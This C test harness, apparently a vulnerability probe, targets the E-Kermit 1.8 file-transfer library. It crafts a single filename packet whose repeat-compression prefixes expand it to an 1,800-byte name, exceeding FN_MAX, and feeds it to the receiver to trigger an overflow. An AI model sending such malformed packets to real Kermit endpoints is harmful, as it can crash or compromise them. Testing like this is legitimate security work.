/* Local safety probe for unmodified E-Kermit 1.8; no files or serial devices. */
#include <stdlib.h>
#include <stdio.h>
#include "cdefs.h"
#include "kermit.h"
static int sink(struct k_data *k,UCHAR *p,int n){(void)k;(void)p;(void)n;return X_OK;}
int main(void){
 struct k_data *k=calloc(1,sizeof *k);
 struct k_response *r=calloc(1,sizeof *r);
 short slot; unsigned sum=0; int n=0; UCHAR *p;
 k->txd=sink; k->bct=1;
 if(kermit(K_INIT,k,0,0,"",r)==X_ERROR)return 2;
 /* State after negotiation: short packets, repeat compression, filename next. */
 k->state=R_FILE;k->rptflg=1;k->rptq='~';
 p=getrslot(k,&slot);
 p[n++]=tochar(63);p[n++]=tochar(0);p[n++]='F';
 for(int i=0;i<20;i++){p[n++]='~';p[n++]=tochar(90);p[n++]='A';}
 for(int i=0;i<n;i++)sum+=p[i];
 p[n++]=tochar((sum+((sum&192)>>6))&63);p[n]=0;
 fprintf(stderr,"Checking %d-byte packet expanding to 1800-byte filename; FN_MAX=%d\n",n,FN_MAX);
 int rc=kermit(K_RUN,k,slot,n,"",r);
 fprintf(stderr,"result=%d\n",rc);free(r);free(k);return 0;
}
